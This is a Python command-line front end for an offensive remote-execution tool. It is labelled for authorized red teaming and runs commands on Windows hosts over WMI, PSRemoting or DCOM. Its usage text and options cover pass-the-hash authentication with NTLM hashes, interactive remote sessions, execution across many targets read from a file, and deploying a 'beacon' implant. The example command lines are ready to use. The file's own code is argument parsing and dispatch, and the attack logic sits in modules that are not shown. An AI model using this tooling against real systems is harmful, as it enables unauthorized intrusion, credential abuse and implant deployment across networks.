"""
Remote Execution Framework
Command Line Interface

Execute commands on remote Windows systems via WMI, PSRemoting, or DCOM.
For authorized penetration testing and red team operations only.

Usage:
    # WMI execution with password
    python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --method wmi --command "whoami"

    # WMI execution with hash
    python -m remote_exec_framework --target 192.168.1.100 --username admin --hash aad3b435... --method wmi

    # PSRemoting interactive session
    python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --interactive

    # Deploy beacon
    python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --deploy-beacon /tmp/beacon.exe
"""

import argparse
import sys
from pathlib import Path

from .core import RemoteExecutionFramework, Credential, FrameworkConfig
from .methods import list_methods
from .utils.files import load_targets_from_file


def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="WMI/PSRemoting/DCOM Remote Execution Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # WMI with password
    %(prog)s --target 192.168.1.100 --username admin --password Pass123 --method wmi --command "ipconfig"

    # WMI with hash
    %(prog)s --target 192.168.1.100 --username admin --hash aad3b435... --method wmi

    # PSRemoting interactive
    %(prog)s --target 192.168.1.100 --username admin --password Pass123 --interactive

    # DCOM execution
    %(prog)s --target 192.168.1.100 --username admin --password Pass123 --method dcom --command "calc.exe"

    # Multi-target execution
    %(prog)s --targets-file hosts.txt --username admin --password Pass123 --command "whoami"

    # Deploy beacon
    %(prog)s --target 192.168.1.100 --username admin --password Pass123 --deploy-beacon beacon.exe
        """
    )

    # Target specification
    target_group = parser.add_argument_group('Target')
    target_group.add_argument(
        '--target', '-t',
        type=str,
        help='Target IP or hostname'
    )
    target_group.add_argument(
        '--targets-file',
        type=str,
        metavar='FILE',
        help='File with target IPs (one per line) for multi-target execution'
    )

    # Credential specification
    cred_group = parser.add_argument_group('Credentials')
    cred_group.add_argument(
        '--username', '-u',
        type=str,
        required=True,
        help='Username for authentication'
    )
    cred_group.add_argument(
        '--password', '-p',
        type=str,
        help='Password for authentication'
    )
    cred_group.add_argument(
        '--hash', '-H',
        type=str,
        help='NTLM hash for authentication'
    )
    cred_group.add_argument(
        '--domain', '-d',
        type=str,
        default='.',
        help='Domain (default: .)'
    )

    # Method specification
    method_group = parser.add_argument_group('Method')
    method_group.add_argument(
        '--method', '-m',
        type=str,
        choices=list_methods(),
        default='wmi',
        help='Execution method (default: wmi)'
    )
    method_group.add_argument(
        '--command', '-x',
        type=str,
        default='whoami',
        help='Command to execute (default: whoami)'
    )

    # Special modes
    mode_group = parser.add_argument_group('Special Modes')
    mode_group.add_argument(
        '--interactive', '-i',
        action='store_true',
        help='Start interactive PSRemoting session'
    )
    mode_group.add_argument(
        '--deploy-beacon',
        type=str,
        metavar='PATH',
        help='Deploy beacon (path to local beacon file)'
    )

    # Output options
    output_group = parser.add_argument_group('Output')
    output_group.add_argument(
        '--output', '-o',
        type=str,
        default='remote_exec',
        help='Output directory for reports (default: remote_exec)'
    )
    output_group.add_argument(
        '--timeout',
        type=int,
        default=30,
        help='Command timeout in seconds (default: 30)'
    )
    output_group.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Suppress verbose output'
    )

    return parser.parse_args()


def validate_args(args) -> bool:
    """Validate argument combinations"""
    # Need target or targets file
    if not args.target and not args.targets_file:
        print("[-] Error: Must specify --target or --targets-file")
        return False

    # Need password or hash
    if not args.password and not args.hash:
        print("[-] Error: Must specify --password or --hash")
        return False

    # Interactive requires password
    if args.interactive and not args.password:
        print("[-] Error: Interactive session requires --password")
        return False

    # PSRemoting requires password
    if args.method == 'psremoting' and not args.password:
        print("[-] Error: PSRemoting requires --password")
        return False

    # Validate files exist
    if args.targets_file and not Path(args.targets_file).exists():
        print(f"[-] Error: Targets file not found: {args.targets_file}")
        return False

    if args.deploy_beacon and not Path(args.deploy_beacon).exists():
        print(f"[-] Error: Beacon file not found: {args.deploy_beacon}")
        return False

    return True


def main():
    """Main entry point"""
    args = parse_args()

    if not validate_args(args):
        sys.exit(1)

    # Initialize framework
    config = FrameworkConfig(
        output_dir=args.output,
        timeout=args.timeout,
        verbose=not args.quiet
    )

    framework = RemoteExecutionFramework(config)

    # Build credential
    credential = Credential(
        username=args.username,
        password=args.password,
        ntlm_hash=args.hash,
        domain=args.domain
    )

    # Handle different modes
    if args.interactive:
        # Interactive PSRemoting session
        framework.interactive_session(args.target, credential)

    elif args.deploy_beacon:
        # Deploy beacon
        framework.deploy_beacon(
            args.target,
            credential,
            args.deploy_beacon,
            args.method
        )

    elif args.targets_file:
        # Multi-target execution
        targets = load_targets_from_file(args.targets_file)
        framework.execute_on_multiple(
            targets=targets,
            credential=credential,
            command=args.command,
            method=args.method
        )

    else:
        # Single target execution
        framework.execute(
            target=args.target,
            credential=credential,
            command=args.command,
            method=args.method
        )

    # Generate final report
    framework.generate_report()


if __name__ == "__main__":
    main()